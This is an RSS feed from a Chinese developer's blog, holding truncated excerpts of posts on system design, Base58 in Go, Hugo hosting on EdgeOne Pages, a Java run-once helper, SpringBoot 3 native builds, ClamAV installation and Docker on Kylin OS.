<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>整点Bug</title><link>https://www.typesafe.cn/</link><description>Recent content on 整点Bug</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Fri, 22 Aug 2025 13:15:30 +0800</lastBuildDate><atom:link href="https://www.typesafe.cn/index.xml" rel="self" type="application/rss+xml"/><item><title>《关于优秀系统设计我所知道的一切》的总结</title><link>https://www.typesafe.cn/posts/good-system-design-summary/</link><pubDate>Fri, 22 Aug 2025 13:15:30 +0800</pubDate><guid>https://www.typesafe.cn/posts/good-system-design-summary/</guid><description>&lt;p>今天看到 GitHub 高级工程师写的一篇文章《Everything I know about good system design》，写的很好。&lt;/p>
&lt;p>链接地址：&lt;/p>
&lt;p>&lt;a href="https://www.seangoedecke.com/good-system-design/">https://www.seangoedecke.com/good-system-design/&lt;/a>&lt;/p>
&lt;p>总结一下。&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>真正优秀的系统设计是“不起眼的”（underwhelming）和简单的&lt;/strong>。它追求的是长期稳定运行，而不是使用各种时髦、复杂的技术。一个看起来令人印象深刻的复杂系统，往往掩盖了糟糕的底层决策。&lt;/p>&lt;/blockquote>
&lt;h3 id="核心设计哲学">核心设计哲学&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>好的设计是无趣的&lt;/strong>：当你感觉某个系统“比预想的简单”或“从来不用操心”时，这恰恰是好设计的标志。&lt;/li>
&lt;li>&lt;strong>从简单开始&lt;/strong>：一个能正常工作的复杂系统，总是从一个能正常工作的简单系统演化而来的。直接从零开始构建复杂系统是个坏主意。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="状态管理-state">状态管理 (State)&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>状态是万恶之源&lt;/strong>：软件设计中最难的部分就是管理状态（State）。无状态（Stateless）的服务更容易维护，因为出问题时可以直接重启恢复。&lt;/li>
&lt;li>&lt;strong>集中管理状态&lt;/strong>：尽量减少有状态的组件。最佳实践是让一个专门的服务与数据库交互来管理状态，而其他服务通过 API 请求或事件与该服务通信，而不是让多个服务都去读写同一个数据库表。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="核心组件与模式">核心组件与模式&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>数据库 (Database)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>数据库访问通常是性能瓶颈。&lt;/li>
&lt;li>&lt;strong>Schema 设计&lt;/strong>要在灵活性和可读性之间找到平衡。&lt;/li>
&lt;li>为常用查询创建&lt;strong>索引 (Index)&lt;/strong>，并将高基数（high-cardinality）的字段放在前面。&lt;/li>
&lt;li>尽可能让数据库完成工作（如使用 &lt;code>JOIN&lt;/code>），而不是在应用内存中处理数据。&lt;/li>
&lt;li>将&lt;strong>读请求&lt;/strong>分发到只读副本（read-replicas）以减轻主库压力。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>处理慢操作：后台作业 (Background Jobs)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>面向用户的操作必须快速响应（几百毫秒内）。&lt;/li>
&lt;li>耗时长的任务（如转换一个大文件）应该放入&lt;strong>后台作业&lt;/strong>异步处理。这通常通过一个队列（Queue）和作业执行器（Job Runner）实现。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>缓存 (Caching)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>缓存是解决昂贵重复计算的经典方案，但它本质上也是一种&lt;strong>状态&lt;/strong>，会引入复杂性（如缓存失效、数据不一致）。&lt;/li>
&lt;li>高级工程师倾向于尽可能少地使用缓存。在使用缓存前，应首先尝试从根本上优化性能（例如，为慢查询添加索引）。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>事件驱动 (Events)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>事件中心（如 Kafka）用于实现服务解耦。一个服务发布“某事发生”的事件，多个下游服务可以消费该事件并各自处理。&lt;/li>
&lt;li>适用于&lt;strong>发送方不关心消费者行为&lt;/strong>的场景。不要过度使用，很多时候直接的 API 调用更简单、更易于追踪。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h3 id="系统运维与容错">系统运维与容错&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>关注关键路径 (Hot Paths)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>设计时应集中精力处理系统中&lt;strong>最重要&lt;/strong>和&lt;strong>流量最大&lt;/strong>的部分。这些路径的设计方案选择更少，且一旦出错影响巨大。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>日志与监控 (Logging &amp;amp; Metrics)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>在&lt;strong>异常路径&lt;/strong>（unhappy path）中积极记录日志，以便于排查问题。&lt;/li>
&lt;li>除了平均响应时间，还应监控 &lt;strong>p95 和 p99&lt;/strong> 分位值，因为这能反映你最大、最重要客户的真实体验。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>容错设计 (Failing Gracefully)&lt;/strong>&lt;/p></description></item><item><title>Base58 编码详解与 Go 实现</title><link>https://www.typesafe.cn/posts/base58-implementation-in-go/</link><pubDate>Sun, 10 Aug 2025 23:36:35 +0800</pubDate><guid>https://www.typesafe.cn/posts/base58-implementation-in-go/</guid><description>&lt;p>在处理二进制数据时，我们经常需要将其转换成可读的字符串，比如生成地址、密钥、邀请码等。
常见方案有 &lt;strong>Base64&lt;/strong>、&lt;strong>Hex&lt;/strong> 等，但在某些场景下，它们并不是最佳选择。
这时，&lt;strong>Base58&lt;/strong> 就登场了。&lt;/p>
&lt;h2 id="什么是-base58">什么是 Base58？&lt;/h2>
&lt;p>Base58 是一种基于 58 个字符的编码方式，它的设计目标是：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>避免易混淆字符&lt;/strong>（&lt;code>0&lt;/code> 和 &lt;code>O&lt;/code>，&lt;code>l&lt;/code> 和 &lt;code>I&lt;/code>）&lt;/li>
&lt;li>&lt;strong>不包含特殊符号&lt;/strong>（&lt;code>+&lt;/code> &lt;code>/&lt;/code> 等），适合直接用于 URL、文件名&lt;/li>
&lt;li>&lt;strong>更适合人工抄写和阅读&lt;/strong>，降低输入错误率&lt;/li>
&lt;/ul>
&lt;p>它的字符集是：&lt;/p>
&lt;pre tabindex="0">&lt;code>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;p>可以看到，&lt;code>0&lt;/code>、&lt;code>O&lt;/code>、&lt;code>l&lt;/code>、&lt;code>I&lt;/code> 等容易混淆的字符被剔除，没有 &lt;code>+&lt;/code>、&lt;code>/&lt;/code> 这类特殊符号。&lt;/p>&lt;/blockquote>
&lt;hr>
&lt;h2 id="为什么用-base58">为什么用 Base58？&lt;/h2>
&lt;p>假设你有一个用户需要手动输入邀请码、钱包地址或交易 ID：&lt;/p>
&lt;ul>
&lt;li>如果用 &lt;strong>Base64&lt;/strong>，会出现 &lt;code>+&lt;/code> &lt;code>/&lt;/code> 等特殊字符，在 URL 中需要转义；&lt;/li>
&lt;li>如果用 &lt;strong>Hex&lt;/strong>，数据会变得很长（每个字节要用两个字符表示）；&lt;/li>
&lt;li>如果用 &lt;strong>Base58&lt;/strong>，长度更短，可读性更高，错误率更低。&lt;/li>
&lt;/ul>
&lt;p>这也是为什么比特币、IPFS 等项目都选择了 Base58（或其变种 Base58Check）。&lt;/p>
&lt;hr>
&lt;h2 id="base58-在实际项目中的应用">Base58 在实际项目中的应用&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>比特币地址&lt;/strong>：Base58Check 编码，防止字符混淆并带有校验码&lt;/li>
&lt;li>&lt;strong>IPFS CID&lt;/strong>：文件内容 ID 使用 Base58 编码，更短且可直接用在命令行&lt;/li>
&lt;li>&lt;strong>邀请码 / 短链&lt;/strong>：直接放在 URL 中，不需要额外转义&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="go-语言-base58-编码示例">Go 语言 Base58 编码示例&lt;/h2>
&lt;p>这里用我开源的 Golang Base58 库来演示：&lt;/p></description></item><item><title>使用 EdgeOne Pages 托管Hugo博客</title><link>https://www.typesafe.cn/posts/hugo-on-edgeone-pages/</link><pubDate>Fri, 11 Jul 2025 12:30:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/hugo-on-edgeone-pages/</guid><description>&lt;p>自从腾讯云客服给我打电话说我的备案域名解析到了境外IP上让我整改，已经过去了两年。&lt;/p>
&lt;p>当时我把解析到 Github Pages 的域名更改到了轻量云，并且把 Github Pages 打包下来使用 Caddy 搭建了静态网站，由于更新不便，我再也没有更新过博客。&lt;/p>
&lt;p>前段时间白嫖了 EdgeOne 免费 CDN 测试加速 Github Pages，说实话并不好用。&lt;/p>
&lt;p>首先第一次请求回源到 Github 特别慢，大概率是用了国内的节点去请求；其次 CDN 的缓存加速功能，我更新了博客的内容就需要手动把 CDN 的缓存全部清空才行，不缓存的话又起不到加速的作用。&lt;/p>
&lt;p>今天忙里偷闲，测试一下EdgeOne Pages 托管Hugo博客，EdgeOne Pages 是支持 Node.js 相关的框架预设，我以为托管 Hugo 博客会很麻烦，结果发现真的很简单。&lt;/p>
&lt;p>首先，你要先把 Hugo 托管到 Github Pages 上，这步教程很多，我就不再赘述。&lt;/p>
&lt;p>然后，你要在 EdgeOne 上创建一个 Pages 项目，选择你的 Github Pages 仓库，记得分支选择编译后文件所在的 &lt;code>gh-pages&lt;/code> 然后选择 Other 预设，其他不需要改变。&lt;/p>
&lt;p>&lt;img src="https://www.typesafe.cn/images/edgeone-pages-deploy.png" alt="">&lt;/p>
&lt;p>最后点击开始部署，等待部署完成即可。&lt;/p>
&lt;hr>
&lt;p>每次提交后，Github Action 自动编译发布在分支 &lt;code>gh-pages&lt;/code> 上， EdgeOne 会自动检测到仓库 &lt;code>gh-pages&lt;/code> 分支的变化，最后更新到 EdgeOne Pages 上。&lt;/p></description></item><item><title>about</title><link>https://www.typesafe.cn/about/</link><pubDate>Wed, 01 Jan 2025 23:36:35 +0800</pubDate><guid>https://www.typesafe.cn/about/</guid><description>&lt;p>你好，我是杜世翔，软件开发工程师。&lt;/p>
&lt;p>我主要使用 Golang，对 Java、JavaScript、Python 也比较熟悉。&lt;/p>
&lt;p>目前在奇安信从事安全开发工作。&lt;/p>
&lt;hr>
&lt;p>我开发了 &lt;a href="https://github.com/dushixiang/next-terminal">Next Terminal&lt;/a> ，一个简洁、安全、易用的运维审计系统，支持多种远程访问协议，包括 RDP、SSH、VNC、Telnet、HTTP 等，适用于企业级运维场景。&lt;/p>
&lt;hr>
&lt;p>以下是我开源的其他几个项目：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>&lt;a href="https://github.com/dushixiang/kafka-map">kafka-map&lt;/a>&lt;/strong> 一个美观简洁且强大的kafka web管理工具。&lt;/li>
&lt;li>&lt;strong>&lt;a href="https://github.com/dushixiang/4dnat">4dnat&lt;/a>&lt;/strong> 一个专门为目的地址转发而服务的工具。&lt;/li>
&lt;/ul></description></item><item><title>在 Java 里如何让方法只执行一次？</title><link>https://www.typesafe.cn/posts/how-does-java-make-methods-execute-only-once/</link><pubDate>Sun, 02 Apr 2023 13:18:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/how-does-java-make-methods-execute-only-once/</guid><description>&lt;p>最近一年时间一直在写 Golang ，也算是对 Golang 有了初步的掌握，再次写 Java 的时候发现有点生疏了，写代码的时候也不自觉代入了写 Golang 的思维。&lt;/p>
&lt;p>正如我想要在 Java 里面想让某一个方法只执行一次的时候，我第一时间想到了 Golang 里面的 &lt;code>Once&lt;/code> 功能。&lt;/p>
&lt;blockquote>
&lt;p>&lt;code>sync.Once&lt;/code> 是 Golang 的一个并发原语，它提供了一种安全地在多个 goroutine 中执行某个函数（或代码块）一次的机制。&lt;/p>
&lt;p>&lt;code>sync.Once&lt;/code> 类型有一个 &lt;code>Do&lt;/code> 方法，该方法接收一个函数作为参数，并确保这个函数只会被执行一次，无论有多少个 goroutine 同时调用它。具体来说，第一个调用 Do 方法的 goroutine 会执行这个函数，而其他 goroutine 则会等待它完成，然后返回相同的结果。&lt;/p>
&lt;p>&lt;code>sync.Once&lt;/code> 可以用于一些需要全局初始化的场景，比如初始化配置信息、数据库连接等。使用 sync.Once 可以确保这些初始化只会被执行一次，并且可以安全地被多个 goroutine 共享使用。&lt;/p>
&lt;p>&amp;ndash; 来自 ChatGPT&lt;/p>&lt;/blockquote>
&lt;p>其实和&lt;code>单例模式&lt;/code>差不多，但我想要的是让方法只执行一次，我魔改了一下，直接上代码吧。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> cn.typesafe.sync;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> lombok.SneakyThrows;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.util.concurrent.Callable;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Once&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>T&lt;span style="color:#f92672">&amp;gt;&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">volatile&lt;/span> T t &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#a6e22e">@SneakyThrows&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">public&lt;/span> T &lt;span style="color:#a6e22e">doOnce&lt;/span>(Callable&lt;span style="color:#f92672">&amp;lt;&lt;/span>T&lt;span style="color:#f92672">&amp;gt;&lt;/span> action) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (t &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">synchronized&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				&lt;span style="color:#66d9ef">if&lt;/span> (t &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>					t &lt;span style="color:#f92672">=&lt;/span> action.&lt;span style="color:#a6e22e">call&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">return&lt;/span> t;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>单元测试&lt;/p></description></item><item><title>SpringBoot 3.0.0尝鲜与Java打包原生二进制【一】</title><link>https://www.typesafe.cn/posts/kafka-map-springboot3-graalvm-1/</link><pubDate>Sat, 26 Nov 2022 23:44:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/kafka-map-springboot3-graalvm-1/</guid><description>&lt;p>2022年11月24日 SpringBoot 正式发布了 3.0 版本，带来许多新的特性，但我最关心的还是Java打包成原生二进制，运行时不再依赖jre环境，运行Java程序将和Go程序一样方便。&lt;/p>
&lt;h2 id="升级至-springboot-300">升级至 SpringBoot 3.0.0&lt;/h2>
&lt;p>说是尝鲜，但是我不想再试着搞 hello world 那种啥都没有的东西了，找到我之前写的一个Java开源项目 &lt;a href="https://github.com/dushixiang/kafka-map">kafka-map&lt;/a> 拿他开刀。&lt;/p>
&lt;p>&lt;a href="https://github.com/dushixiang/kafka-map">kafka-map&lt;/a> 本身是基于 SpringBoot 2.4.x 开发的，sqlite 存储数据，且很久没有大的更新了，想要直接升级到 SpringBoot 3.0.0 是不可能的，我按照官方文档 &lt;a href="https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-3.0-Migration-Guide">Spring Boot 3.0 迁移指南&lt;/a> 首先升级到最新2.7.x版本，然后就发现 service 依赖循环了，这个时候有两种选择，一是在配置文件中允许依赖循环 &lt;code>spring.main.allow-circular-references: true&lt;/code>，二是梳理业务逻辑解决依赖循环的问题。作为一个合格的开发，我选择了解决依赖循环的问题，过程不表。&lt;/p>
&lt;p>SpringBoot 3.0.0 升级了很多组件，其中 Jpa 依赖的 Hibernate 升级到了 6.x，我启动时又遇到了 sqlite 方言插件不可用的问题，还好 Hibernate 6.x 已经支持了 sqlite方言，切换到官方插件就好了。配置文件如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">spring&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">datasource&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">url&lt;/span>: &lt;span style="color:#ae81ff">jdbc:sqlite:data/kafka-map.db&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">driver-class-name&lt;/span>: &lt;span style="color:#ae81ff">org.sqlite.JDBC&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">jpa&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">hibernate&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">ddl-auto&lt;/span>: &lt;span style="color:#ae81ff">update&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">show-sql&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">properties&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">hibernate&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">dialect&lt;/span>: &lt;span style="color:#ae81ff">org.hibernate.community.dialect.SQLiteDialect&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="原生二进制打包">原生二进制打包&lt;/h2>
&lt;p>打包原生二进制还是最折腾的，刚开始参考&lt;a href="https://docs.spring.io/spring-boot/docs/3.0.0/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks">GraalVM Native Image Support&lt;/a> 把打包 &lt;code>springboot:build-image&lt;/code> 当成了打包原生二进制了，而且打包的过程中还遇到了 &lt;code>UnsupportedFeatureException: No instances of ch.qos.logback.classic.Logger&lt;/code> 这个问题，找了一圈也没找到解决方案。&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/k5.png" alt="image.png">&lt;/p></description></item><item><title>Linux 杀毒软件 ClamAV 安装</title><link>https://www.typesafe.cn/posts/clamav-install/</link><pubDate>Mon, 07 Mar 2022 21:52:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/clamav-install/</guid><description>&lt;p>&lt;strong>Clam AntiVirus&lt;/strong>（&lt;strong>ClamAV&lt;/strong>）是免费而且开放源代码的杀毒软件，软件与病毒码的更新皆由社群免费发布。Github 地址：https://github.com/Cisco-Talos/clamav&lt;/p>
&lt;h3 id="安装-clamav">安装 ClamAV&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install -y clamav*
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="配置-clamav">配置 ClamAV&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cat &amp;gt; /etc/freshclam.conf &lt;span style="color:#e6db74">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"># 数据库配置文件夹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">DatabaseDirectory /var/lib/clamav
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"># 更新日志文件夹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">UpdateLogFile /var/log/freshclam.log
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"># 日志大小
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">LogFileMaxSize 2M
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"># 日志记录时间
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">LogTime yes
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"># 所属用户
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">DatabaseOwner root
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"># 同步病毒库的地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">DatabaseMirror database.clamav.net
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="更新病毒库">更新病毒库&lt;/h3>
&lt;p>大概需要几分钟时间&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>freshclam
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="进行病毒扫描测试">进行病毒扫描测试&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>clamscan -ri &amp;lt;/path1/to/scan&amp;gt; &amp;lt;/path2/to/scan&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>常用配置说明&lt;/p>
&lt;pre tabindex="0">&lt;code>--recursive[=yes/no(*)] -r 递归查找
--infected -I 只打印受影响的文件信息
--remove[=yes/no(*)] 删除受影响的文件。(不建议使用,根据扫描结果进行手动删除,避免误删。)
&lt;/code>&lt;/pre>&lt;h3 id="配置邮箱">配置邮箱&lt;/h3>
&lt;p>如果不需要邮件通知的可以忽略此步骤。&lt;/p>
&lt;h4 id="安装邮件服务">安装邮件服务&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install -y mailx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="修改配置">修改配置&lt;/h4>
&lt;p>修改大写字母为你的邮箱配置&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cat &amp;gt; /etc/mail.rc &lt;span style="color:#e6db74">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">set from=USERNAME@YOURDOMAIN.COM
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">set smtp=smtps://smtp.exmail.qq.com:465
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">set smtp-auth=login
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">set smtp-auth-user=USERNAME@YOURDOMAIN.COM
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">set smtp-auth-password=YOURPASSWORD
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">set ssl-verify=ignore
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">set nss-config-dir=/etc/pki/nssdb/
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="发送邮件进行测试">发送邮件进行测试&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;Your message&amp;#34;&lt;/span> | mail -v -s &lt;span style="color:#e6db74">&amp;#34;Message Subject&amp;#34;&lt;/span> email@address
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果出现 “Error in certificate: Peer&amp;rsquo;s certificate issuer is not recognized” 属于正常。&lt;/p></description></item><item><title>在银河麒麟高级服务器操作系统V10上安装docker</title><link>https://www.typesafe.cn/posts/install-docker-on-kylinos/</link><pubDate>Tue, 21 Dec 2021 23:39:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/install-docker-on-kylinos/</guid><description>&lt;blockquote>
&lt;p>银河麒麟高级服务器操作系统 V10 是针对企业级关键业务，适应虚拟化、 云计算、大数据、工业互联网时代对主机系统可靠性、安全性、性能、扩展性和 实时性的需求，依据 CMMI 5 级标准研制的提供内生安全、云原生支持、国产 平台深入优化、高性能、易管理的新一代自主服务器操作系统；同源支持飞腾、 龙芯、申威、兆芯、海光、鲲鹏等自主平台；可支撑构建大型数据中心服务器高 可用集群、负载均衡集群、分布式集群文件系统、虚拟化应用和容器云平台等， 可部署在物理服务器和虚拟化环境、私有云、公有云和混合云环境；应用于政府、 国防、金融、教育、财税、公安、审计、交通、医疗、制造等领域。&lt;/p>&lt;/blockquote>
&lt;p>公司有个项目需要将系统部署在 &lt;strong>kylinos&lt;/strong>上，刚开始还有点头疼，害怕各种程序无法安装和使用，等安装好服务器进行使用的时候发现这不就是基于centos的嘛，虽然基于哪个版本不知道，但是可以测试的，于是我一顿操作，最后发现它是基于Centos8的，系统内核版本是 4.19，问题不大，既然是基于Centos8的，那Centos8上能跑的程序，在这肯定也能跑，然后我就开始了愉快（痛苦）的安装docker之旅了。&lt;/p>
&lt;h3 id="配置阿里云centos8镜像源">配置阿里云Centos8镜像源&lt;/h3>
&lt;p>之所以要配置 Centos8 的镜像源是因为在安装docker的时候需要额外的一些依赖，而这些依赖在麒麟官方的源里面是没有的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-8.repo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="配置阿里云-docker-镜像源">配置阿里云 docker 镜像源&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
